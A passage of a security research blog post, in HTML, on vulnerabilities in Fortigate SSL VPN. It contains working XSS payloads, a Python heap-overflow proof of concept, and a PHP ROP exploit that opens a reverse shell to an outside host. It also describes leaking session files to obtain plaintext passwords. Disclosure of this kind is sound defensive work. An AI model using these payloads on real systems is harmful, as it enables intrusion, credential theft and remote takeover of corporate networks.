@@ -1,0 +1,479 @@
+
+<!DOCTYPE html>
+<html lang="zh-TW">
+  <head>
+    <meta charset="utf-8" />
+    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
+    <meta content="width=device-width, initial-scale=1" name="viewport" />
+    <title>Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN | DEVCORE</title><link href="/assets/themes/devcore-v2/stylesheets/webpack_bundle.css" rel="stylesheet" />
+    <link href="/assets/themes/devcore-v2/images/favicon.png" rel="icon" size="32x32">
+    <meta name="description" property="og:description" content="Last month, we talked about Palo Alto Networks GlobalProtect RCE as an appetizer. Today, here comes the main dish!" />
+    <meta name="keywords" content="Advisory, VPN, RCE" />
+    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
+    <meta property="og:title" content="Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN | DEVCORE 戴夫寇爾" />
+    <meta property="og:url" content="https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="https://devco.re/assets/img/blog/20190807/cover.png" />
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="d3vc0r3">
+    <meta name="twitter:title" content="Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN | DEVCORE 戴夫寇爾">
+    <meta name="twitter:description" content="Last month, we talked about Palo Alto Networks GlobalProtect RCE as an appetizer. Today, here comes the main dish!">
+    <meta name="twitter:creator" content="d3vc0r3">
+    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20190807/cover.png">
+    <meta name="twitter:domain" content="devco.re">
+    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
+    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
+    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
+    <meta name='yandex-verification' content='4561963cf1d18fe3' />
+    <meta property="fb:admins" content="120968921404653" />
+
+    <link rel="canonical" href="https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/"/>
+    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">
+    <link rel="publisher" href="https://plus.google.com/118439315679478709768/" />
+
+  </head>
+  <body>
+    <div class="page">
+      <div class="container--wrapper">
+        <div class="topbar">
+          <div class="topbar__brand">
+            <a href="/en/">
+                <div class="logo">
+                  DEVCORE
+                </div></a>
+            <p class="slogan">
+              We offer professional <a href="/en/services/penetration-test" class="link">pentesting</a>, <a href="/en/services/red-team" class="link">red teaming</a>, <a href="/en/services/security-consulting" class="link">consulting</a>, and <a href="/en/services/security-training" class="link">training</a> services
+            </p>
+          </div>
+          <div class="drawer" id="drawer">
+            <div class="drawer__container">
+              <nav class="main-menu">
+                <div class="hidden">
+                  Menu
+                </div>
+                <a href="/en/services/penetration-test" class="main-menu__link mobile-only">Penetration Testing</a>
+                <a href="/en/services/red-team" class="main-menu__link mobile-only">Red Team Assessment</a>
+                <a href="/en/services/security-consulting" class="main-menu__link mobile-only">Consulting</a>
+                <a href="/en/services/security-training" class="main-menu__link mobile-only">Training</a>
+                <a href="/en/about/" class="main-menu__link">Hackers</a><a href="/en/blog/" class="main-menu__link">News</a><a href="/en/search/" class="main-menu__link main-menu__search desktop-only"><span class="hidden">Search</span><svg class="icon-search icon"><use xlink:href="#icon-search" /></svg></a>
+              </nav>
+              <a href="/en/contact/" class="drawer__contact button--dense">Contact</a>
+              <nav class="lang-menu">
+                <div class="lang-menu__label">
+                  Lang:
+                </div>
+                <a href="/" class="lang-menu__link">中文</a>
+                <a href="/en/" class="lang-menu__link">English</a>
+              </nav>
+            </div>
+          </div><span class="topbar__menu mobile-only">menu</span><button class="appearance-none topbar__hamburger mobile-only" data-toggle="#drawer" id="drawer-toggle" type="button">
+            <div class="bars">
+              <div class="bar"></div>
+              <div class="bar"></div>
+              <div class="bar"></div>
+            </div>
+          </button>
+        </div>
+      </div><main role="main">
+
+
+          <div class="container--wrapper">
+            <div class="container">
+              <section class="blog-header">
+                <small class="blog-header__category"><a href="/en/blog/category/Tech Editorials/">Tech Editorials</a></small>
+                <img src="https://devco.re/assets/img/blog/20190807/cover.png" class="blog-header__image" alt="Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN" />
+                <h1 class="blog-header__title">
+                  Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN
+                </h1>
+                <div class="blog-header__tags">
+                  
+                  <a href="/en/blog/tag/Advisory/" class="blog-header__tag">Advisory</a><a href="/en/blog/tag/VPN/" class="blog-header__tag">VPN</a><a href="/en/blog/tag/RCE/" class="blog-header__tag">RCE</a>
+                </div>
+          
+          
+                <p class="blog-header__info">
+                  By <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/meh.jpg)"></span> <a href="/en/blog/author/meh" class="author-name">Meh</a> <time class="date">on 2019-08-09 </time>
+                </p>
+          
+              </section>
+              <article class="article">
+          <p>Author: Meh Chang(<a href="https://twitter.com/mehqq_">@mehqq_</a>) and Orange Tsai(<a href="https://twitter.com/orange_8361">@orange_8361</a>)</p>
+
+<p>Last month, we talked about <a href="https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/">Palo Alto Networks GlobalProtect RCE</a> as an appetizer. Today, here comes the main dish! If you cannot go to Black Hat or DEFCON for our talk, or you are interested in more details, here is the slides for you!</p>
+<ul>
+  <li><a href="https://i.blackhat...">Infiltrating Corporate Intranet Like NSA: Pre-auth RCE on Leading SSL VPNs</a></li>
+</ul>
+
+<p><em>P.S. It seems the slides link on Black Hat official website is dead, it should be up ASAP</em></p>
+
+<p>We will also give a speech at the following conferences, just come and find us!</p>
+<ul>
+  <li><a href="https://hitcon.org/2019/CMT/agenda">HITCON</a> - Aug. 23 @ Taipei (Chinese)</li>
+  <li><a href="https://gsec.hitb.org/sg2019/agenda/">HITB GSEC</a> - Aug. 29,30 @ Singapore</li>
+  <li><a href="https://www.romhack.io/program_en-2019.html">RomHack</a> - Sep. 28 @ Rome</li>
+  <li>and more …</li>
+</ul>
+
+<h1 id="lets-start">Let’s start!</h1>
+
+<p>The story began in last August, when we started a new research project on SSL VPN. Compare to the site-to-site VPN such as the IPSEC and PPTP, SSL VPN is more easy to use and compatible with any network environments. For its convenience, SSL VPN becomes the most popular remote access way for enterprise!</p>
+
+<p>However, what if this trusted equipment is insecure? It is an important corporate asset but a blind spot of corporation. According to our survey on Fortune 500, the Top-3 SSL VPN vendors dominate about 75% market share. The diversity of SSL VPN is narrow. Therefore, once we find a critical vulnerability on the leading SSL VPN, the impact is huge. There is no way to stop us because SSL VPN must be exposed to the internet.</p>
+
+<p>At the beginning of our research, we made a little survey on the CVE amount of leading SSL VPN vendors:</p>
+
+<p><img src="/assets/img/blog/20190807/1.png" alt="" /></p>
+
+<p>It seems like Fortinet and Pulse Secure are the most secure ones. Is that true? As a myth buster, we took on this challenge and started hacking Fortinet and Pulse Secure! This story is about hacking <strong>Fortigate SSL VPN</strong>. The next article is going to be about <strong>Pulse Secure</strong>, which is the most splendid one! Stay tuned!</p>
+
+<h1 id="fortigate-ssl-vpn">Fortigate SSL VPN</h1>
+
+<p>Fortinet calls their SSL VPN product line as Fortigate SSL VPN, which is prevalent among end users and medium-sized enterprise. There are more than 480k servers operating on the internet and is common in Asia and Europe. We can identify it from the URL <code class="highlighter-rouge">/remote/login</code>. Here is the technical feature of Fortigate:</p>
+
+<ul>
+  <li>
+    <p>All-in-one binary<br />
+  We started our research from the file system. We tried to list the binaries in <code class="highlighter-rouge">/bin/</code> and found there are all symbolic links, pointing to <code class="highlighter-rouge">/bin/init</code>. Just like this:</p>
+
+    <p><img src="/assets/img/blog/20190807/2.png" alt="" /></p>
+
+    <p>Fortigate compiles all the programs and configurations into a single binary, which makes the <code class="highlighter-rouge">init</code> really huge. It contains thousands of functions and there is no symbol! It only contains necessary programs for the SSL VPN, so the environment is really inconvenient for hackers. For example, there is even no <code class="highlighter-rouge">/bin/ls</code> or <code class="highlighter-rouge">/bin/cat</code>!</p>
+  </li>
+  <li>
+    <p>Web daemon<br />
+  There are 2 web interfaces running on the Fortigate. One is for the admin interface, handled with <code class="highlighter-rouge">/bin/httpsd</code> on the port 443. The other is normal user interface, handled with <code class="highlighter-rouge">/bin/sslvpnd</code> on the port 4433 by default. Generally, the admin page should be restricted from the internet, so we can only access the user interface.</p>
+
+    <p>Through our investigation, we found the web server is modified from apache, but it is the apache from 2002. Apparently they modified apache in 2002 and added their own additional functionality. We can map the source code of apache to speed up our analysis.</p>
+
+    <p>In both web service, they also compiled their own apache modules into the binary to handle each URL path. We can find a table specifying the handlers and dig into them!</p>
+  </li>
+  <li>
+    <p>WebVPN<br />
+  WebVPN is a convenient proxy feature which allows us connect to all the services simply through a browser. It supports many protocols, like HTTP, FTP, RDP. It can also handle various web resources, such as WebSocket and Flash. To process a website correctly, it parses the HTML and rewrites all the URLs for us. This involves heavy string operation, which is prone to memory bugs.</p>
+  </li>
+</ul>
+
+<h1 id="vulnerabilities">Vulnerabilities</h1>
+
+<p>We found several vulnerabilities:</p>
+
+<h3 id="cve-2018-13379-pre-auth-arbitrary-file-reading"><a href="https://fortiguard.com/psirt/FG-IR-18-384">CVE-2018-13379</a>: Pre-auth arbitrary file reading</h3>
+<p>While fetching corresponding language file, it builds the json file path with the parameter <code class="highlighter-rouge">lang</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">snprintf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="s">"/migadmin/lang/%s.json"</span><span class="p">,</span> <span class="n">lang</span><span class="p">);</span>
+</code></pre></div></div>
+<p>There is no protection, but a file extension appended automatically. It seems like we can only read json file. However, actually we can abuse the feature of <code class="highlighter-rouge">snprintf</code>. According to the man page, it writes <strong>at most size-1</strong> into the output string. Therefore, we only need to make it exceed the buffer size and the <code class="highlighter-rouge">.json</code> will be stripped. Then we can read whatever we want.</p>
+
+<h3 id="cve-2018-13380-pre-auth-xss"><a href="https://fortiguard.com/psirt/FG-IR-18-383">CVE-2018-13380</a>: Pre-auth XSS</h3>
+<p>There are several XSS:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1)%3C/script%3E
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/remote/loginredir?redir=6a6176617363726970743a616c65727428646f63756d656e742e646f6d61696e29
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/message?title=x&amp;msg=%26%23&lt;svg/onload=alert(1)&gt;;
+</code></pre></div></div>
+
+<h3 id="cve-2018-13381-pre-auth-heap-overflow"><a href="https://fortiguard.com/psirt/FG-IR-18-387">CVE-2018-13381</a>: Pre-auth heap overflow</h3>
+<p>While encoding HTML entities code, there are 2 stages. The server first calculate the required buffer length for encoded string. Then it encode into the buffer. In the calculation stage, for example, encode string for <code class="highlighter-rouge">&lt;</code> is <code class="highlighter-rouge">&amp;#60;</code> and this should occupies 5 bytes. If it encounter anything starts with <code class="highlighter-rouge">&amp;#</code>, such as <code class="highlighter-rouge">&amp;#60;</code>, it consider there is a token already encoded, and count its length directly. Like this:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">c</span> <span class="o">=</span> <span class="n">token</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="sc">'('</span> <span class="o">||</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">')'</span> <span class="o">||</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">'#'</span> <span class="o">||</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">'&lt;'</span> <span class="o">||</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">'&gt;'</span><span class="p">)</span>
+    <span class="n">cnt</span> <span class="o">+=</span> <span class="mi">5</span><span class="p">;</span>
+<span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="sc">'&amp;'</span> <span class="o">&amp;&amp;</span> <span class="n">html</span><span class="p">[</span><span class="n">idx</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'#'</span><span class="p">)</span>
+    <span class="n">cnt</span> <span class="o">+=</span> <span class="n">len</span><span class="p">(</span><span class="n">strchr</span><span class="p">(</span><span class="n">html</span><span class="p">[</span><span class="n">idx</span><span class="p">],</span> <span class="sc">';'</span><span class="p">)</span><span class="o">-</span><span class="n">idx</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>However, there is an inconsistency between length calculation and encoding process. The encode part does not handle that much.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">switch</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">case</span> <span class="sc">'&lt;'</span><span class="p">:</span>
+        <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">counter</span><span class="p">],</span> <span class="s">"&amp;#60;"</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
+        <span class="n">counter</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="sc">'&gt;'</span><span class="p">:</span>
+    <span class="c1">// ...</span>
+    <span class="k">default</span><span class="o">:</span>
+        <span class="n">buf</span><span class="p">[</span><span class="n">counter</span><span class="p">]</span> <span class="o">=</span> <span class="n">c</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="n">counter</span><span class="o">++</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>If we input a malicious string like <code class="highlighter-rouge">&amp;#&lt;&lt;&lt;;</code>, the <code class="highlighter-rouge">&lt;</code> is still encoded into <code class="highlighter-rouge">&amp;#60;</code>, so the result should be <code class="highlighter-rouge">&amp;#&amp;#60;&amp;#60;&amp;#60;;</code>! This is much longer than the expected length 6 bytes, so it leads to a heap overflow.</p>
+
+<p>PoC:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">'title'</span><span class="p">:</span> <span class="s">'x'</span><span class="p">,</span> 
+    <span class="s">'msg'</span><span class="p">:</span> <span class="s">'&amp;#'</span> <span class="o">+</span> <span class="s">'&lt;'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20000</span><span class="p">)</span> <span class="o">+</span> <span class="s">';&lt;'</span><span class="p">,</span> 
+<span class="p">}</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://sslvpn:4433/message'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="cve-2018-13382-the-magic-backdoor"><a href="https://fortiguard.com/psirt/FG-IR-18-389">CVE-2018-13382</a>: The magic backdoor</h3>
+<p>In the login page, we found a special parameter called <code class="highlighter-rouge">magic</code>. Once the parameter meets a hardcoded string, we can modify any user’s password.</p>
+
+<p><img src="/assets/img/blog/20190807/3.png" alt="" /></p>
+
+<p>According to our survey, there are still plenty of Fortigate SSL VPN lack of patch. Therefore, considering its severity, we will not disclose the magic string. However, this vulnerability has been <a href="https://twitter.com/codewhitesec/status/1145967317672714240">reproduced by the researcher from CodeWhite</a>. It is surely that other attackers will exploit this vulnerability soon! Please update your Fortigate ASAP!</p>
+
+<blockquote class="twitter-tweet" data-lang="zh-tw"><p lang="en" dir="ltr">Critical vulns in <a href="https://twitter.com/hashtag/FortiOS?src=hash&amp;ref_src=twsrc%5Etfw">#FortiOS</a> reversed &amp; exploited by our colleagues <a href="https://twitter.com/niph_?ref_src=twsrc%5Etfw">@niph_</a> and <a href="https://twitter.com/ramoliks?ref_src=twsrc%5Etfw">@ramoliks</a> - patch your <a href="https://twitter.com/hashtag/FortiOS?src=hash&amp;ref_src=twsrc%5Etfw">#FortiOS</a> asap and see the <a href="https://twitter.com/hashtag/bh2019?src=hash&amp;ref_src=twsrc%5Etfw">#bh2019</a> talk of <a href="https://twitter.com/orange_8361?ref_src=twsrc%5Etfw">@orange_8361</a> and <a href="https://twitter.com/mehqq_?ref_src=twsrc%5Etfw">@mehqq_</a> for details (tnx guys for the teaser that got us started) <a href="https://t.co/TLLEbXKnJ4">pic.twitter.com/TLLEbXKnJ4</a></p>&mdash; Code White GmbH (@codewhitesec) <a href="https://twitter.com/codewhitesec/status/1145967317672714240?ref_src=twsrc%5Etfw">2019年7月2日</a></blockquote>
+<script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+<h3 id="cve-2018-13383-post-auth-heap-overflow"><a href="https://fortiguard.com/psirt/FG-IR-18-388">CVE-2018-13383</a>: Post-auth heap overflow</h3>
+
+<p>This is a vulnerability on the WebVPN feature. While parsing JavaScript in the HTML, it tries to copy content into a buffer with the following code:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">memcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">js_buf</span><span class="p">,</span> <span class="n">js_buf_len</span><span class="p">);</span>
+</code></pre></div></div>
+<p>The buffer size is fixed to <code class="highlighter-rouge">0x2000</code>, but the input string is unlimited. Therefore, here is a heap overflow. It is worth to note that this vulnerability can overflow Null byte, which is useful in our exploitation.<br />
+To trigger this overflow, we need to put our exploit on an HTTP server, and then ask the SSL VPN to proxy our exploit as a normal user.</p>
+
+<h1 id="exploitation">Exploitation</h1>
+
+<p>The official advisory described no RCE risk at first. Actually, it was a misunderstanding. We will show you how to exploit from the user login interface without authentication.</p>
+
+<h3 id="cve-2018-13381">CVE-2018-13381</h3>
+<p>Our first attempt is exploiting the pre-auth heap overflow. However, there is a fundamental defect of this vulnerability – It does not overflow Null bytes. In general, this is not a serious problem. The heap exploitation techniques nowadays should overcome this. However, we found it a disaster doing heap feng shui on Fortigate. There are several obstacles, making the heap unstable and hard to be controlled.</p>
+<ul>
+  <li>Single thread, single process, single allocator<br />
+  The web daemon handles multiple connection with <code class="highlighter-rouge">epoll()</code>, no multi-process or multi-thread, and the main process and libraries use the same heap, called JeMalloc. It means, all the memory allocations from all the operations of all the connections are on the same heap. Therefore, the heap is really messy.</li>
+  <li>Operations regularly triggered<br />
+  This interferes the heap but is uncontrollable. We cannot arrange the heap carefully because it would be destroyed.</li>
+  <li>Apache additional memory management. <br />
+  The memory won’t be <code class="highlighter-rouge">free()</code> until the connection ends. We cannot arrange the heap in a single connection. Actually this can be an effective mitigation for heap vulnerabilities especially for use-after-free.</li>
+  <li>JeMalloc<br />
+  JeMalloc isolates meta data and user data, so it is hard to modify meta data and play with the heap management. Moreover, it centralizes small objects, which also limits our exploit.</li>
+</ul>
+
+<p>We were stuck here, and then we chose to try another way. If anyone exploits this successfully, please teach us!</p>
+
+<h3 id="cve-2018-13379--cve-2018-13383">CVE-2018-13379 + CVE-2018-13383</h3>
+<p>This is a combination of pre-auth file reading and post-auth heap overflow. One for gaining authentication and one for getting a shell.</p>
+
+<ul>
+  <li>
+    <p>Gain authentication<br />
+  We first use CVE-2018-13379 to leak the session file. The session file contains valuable information, such as username and plaintext password, which let us login easily.</p>
+
+    <p><img src="/assets/img/blog/20190807/4.png" alt="" /></p>
+  </li>
+  <li>
+    <p>Get the shell<br />
+  After login, we can ask the SSL VPN to proxy the exploit on our malicious HTTP server, and then trigger the heap overflow.</p>
+
+    <p>Due to the problems mentioned above, we need a nice target to overflow. We cannot control the heap carefully, but maybe we can find something <strong>regularly</strong> appears! It would be great if it is <strong>everywhere</strong>, and every time we trigger the bug, we can overflow it easily! However, it is a hard work to find such a target from this huge program, so we were stuck at that time … and we started to fuzz the server, trying to get something useful.</p>
+
+    <p>We got an interesting crash. To our great surprise, we almost control the program counter!</p>
+
+    <p><img src="/assets/img/blog/20190807/5.png" alt="" /></p>
+
+    <p>Here is the crash, and that’s why we love fuzzing! ;)</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Program received signal SIGSEGV, Segmentation fault.
+  0x00007fb908d12a77 in SSL_do_handshake () from /fortidev4-x86_64/lib/libssl.so.1.1
+  2: /x $rax = 0x41414141
+  1: x/i $pc
+  =&gt; 0x7fb908d12a77 &lt;SSL_do_handshake+23&gt;: callq *0x60(%rax)
+  (gdb)
+</code></pre></div>    </div>
+
+    <p>The crash happened in <a href="https://github.com/openssl/openssl/blob/master/ssl/ssl_lib.c#L3716"><code class="highlighter-rouge">SSL_do_handshake()</code></a></p>
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kt">int</span> <span class="nf">SSL_do_handshake</span><span class="p">(</span><span class="n">SSL</span> <span class="o">*</span><span class="n">s</span><span class="p">)</span>
+  <span class="p">{</span>
+      <span class="c1">// ...</span>
+
+      <span class="n">s</span><span class="o">-&gt;</span><span class="n">method</span><span class="o">-&gt;</span><span class="n">ssl_renegotiate_check</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+      <span class="k">if</span> <span class="p">(</span><span class="n">SSL_in_init</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">||</span> <span class="n">SSL_in_before</span><span class="p">(</span><span class="n">s</span><span class="p">))</span> <span class="p">{</span>
+          <span class="k">if</span> <span class="p">((</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">mode</span> <span class="o">&amp;</span> <span class="n">SSL_MODE_ASYNC</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">ASYNC_get_current_job</span><span class="p">()</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+              <span class="k">struct</span> <span class="n">ssl_async_args</span> <span class="n">args</span><span class="p">;</span>
+
+              <span class="n">args</span><span class="p">.</span><span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
+
+              <span class="n">ret</span> <span class="o">=</span> <span class="n">ssl_start_async_job</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">args</span><span class="p">,</span> <span class="n">ssl_do_handshake_intern</span><span class="p">);</span>
+          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+              <span class="n">ret</span> <span class="o">=</span> <span class="n">s</span><span class="o">-&gt;</span><span class="n">handshake_func</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+          <span class="p">}</span>
+      <span class="p">}</span>
+      <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+  <span class="p">}</span>
+</code></pre></div>    </div>
+    <p>We overwrote the function table inside <a href="https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1080"><code class="highlighter-rouge">struct SSL</code></a> called <a href="https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1087">method</a>, so when the program trying to execute <code class="highlighter-rouge">s-&gt;method-&gt;ssl_renegotiate_check(s, 0);</code>, it crashed.</p>
+
+    <p>This is actually an ideal target of our exploit! The allocation of <code class="highlighter-rouge">struct SSL</code> can be triggered easily, and the size is just close to our JaveScript buffer, so it can be nearby our buffer with a regular offset! According to the code, we can see that <code class="highlighter-rouge">ret = s-&gt;handshake_func(s);</code> calls a function pointer, which a perfect choice to control the program flow. With this finding, our exploit strategy is clear.</p>
+
+    <p>We first <strong>spray</strong> the heap with SSL structure with lots of normal requests, and then overflow the SSL structure.</p>
+
+    <p><img src="/assets/img/blog/20190807/6.png" alt="" /></p>
+
+    <p>Here we put our php PoC on an HTTP server:</p>
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="cp">&lt;?php</span>
+      <span class="k">function</span> <span class="nf">p64</span><span class="p">(</span><span class="nv">$address</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nv">$low</span> <span class="o">=</span> <span class="nv">$address</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">;</span>
+          <span class="nv">$high</span> <span class="o">=</span> <span class="nv">$address</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">;</span>
+          <span class="k">return</span> <span class="nb">pack</span><span class="p">(</span><span class="s2">"II"</span><span class="p">,</span> <span class="nv">$low</span><span class="p">,</span> <span class="nv">$high</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="nv">$junk</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
+      <span class="nv">$nop_func</span> <span class="o">=</span> <span class="mh">0x32FC078</span><span class="p">;</span>
+
+      <span class="nv">$gadget</span>  <span class="o">=</span> <span class="nx">p64</span><span class="p">(</span><span class="nv">$junk</span><span class="p">);</span>
+      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="nx">p64</span><span class="p">(</span><span class="nv">$nop_func</span> <span class="o">-</span> <span class="mh">0x60</span><span class="p">);</span>
+      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="nx">p64</span><span class="p">(</span><span class="nv">$junk</span><span class="p">);</span>
+      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="nx">p64</span><span class="p">(</span><span class="mh">0x110FA1A</span><span class="p">);</span> <span class="c1">// # start here # pop r13 ; pop r14 ; pop rbp ; ret ;</span>
+      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="nx">p64</span><span class="p">(</span><span class="nv">$junk</span><span class="p">);</span>
+      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="nx">p64</span><span class="p">(</span><span class="nv">$junk</span><span class="p">);</span>
+      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="nx">p64</span><span class="p">(</span><span class="mh">0x110fa15</span><span class="p">);</span> <span class="c1">// push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;</span>
+      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="nx">p64</span><span class="p">(</span><span class="mh">0x1bed1f6</span><span class="p">);</span> <span class="c1">// pop rax ; ret ;</span>
+      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="nx">p64</span><span class="p">(</span><span class="mh">0x58</span><span class="p">);</span>
+      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="nx">p64</span><span class="p">(</span><span class="mh">0x04410f6</span><span class="p">);</span> <span class="c1">// add rdi, rax ; mov eax, dword [rdi] ; ret  ;</span>
+      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="nx">p64</span><span class="p">(</span><span class="mh">0x1366639</span><span class="p">);</span> <span class="c1">// call system ;</span>
+      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="s2">"python -c 'import socket,sys,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((sys.argv[1],12345));[os.dup2(s.fileno(),x) for x in range(3)];os.system(sys.argv[2]);' xx.xxx.xx.xx /bin/sh;"</span><span class="p">;</span>
+
+      <span class="nv">$p</span>  <span class="o">=</span> <span class="nb">str_repeat</span><span class="p">(</span><span class="s1">'AAAAAAAA'</span><span class="p">,</span> <span class="mi">1024</span><span class="o">+</span><span class="mi">512</span><span class="o">-</span><span class="mi">4</span><span class="p">);</span> <span class="c1">// offset</span>
+      <span class="nv">$p</span> <span class="o">.=</span> <span class="nv">$gadget</span><span class="p">;</span>
+      <span class="nv">$p</span> <span class="o">.=</span> <span class="nb">str_repeat</span><span class="p">(</span><span class="s1">'A'</span><span class="p">,</span> <span class="mh">0x1000</span> <span class="o">-</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$gadget</span><span class="p">));</span>
+      <span class="nv">$p</span> <span class="o">.=</span> <span class="nv">$gadget</span><span class="p">;</span>
+  <span class="cp">?&gt;</span>
+  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"javascript:void(0);</span><span class="cp">&lt;?=</span><span class="nv">$p</span><span class="p">;</span><span class="cp">?&gt;</span><span class="s">"</span><span class="nt">&gt;</span>xxx<span class="nt">&lt;/a&gt;</span>
+</code></pre></div>    </div>
+    <p>The PoC can be divided into three parts.</p>
+    <ol>
+      <li>
+        <p>Fake SSL structure<br />
+ The SSL structure has a regular offset to our buffer, so we can forge it precisely. In order to avoid the crash, we set the <code class="highlighter-rouge">method</code> to a place containing a void function pointer. The parameter at this time is SSL structure itself <code class="highlighter-rouge">s</code>. However, there is only 8 bytes ahead of <code class="highlighter-rouge">method</code>. We cannot simply call <code class="highlighter-rouge">system("/bin/sh");</code> on the HTTP server, so this is not enough for our reverse shell command. Thanks to the huge binary, it is easy to find ROP gadgets. We found one useful for stack pivot:</p>
+
+        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;
+</code></pre></div>        </div>
+        <p>So we set the <code class="highlighter-rouge">handshake_func</code> to this gadget, move the <code class="highlighter-rouge">rsp</code> to our SSL structure, and do further ROP attack.</p>
+      </li>
+      <li>ROP chain<br />
+ The ROP chain here is simple. We slightly move the <code class="highlighter-rouge">rdi</code> forward so there is enough space for our reverse shell command.</li>
+      <li>Overflow string<br />
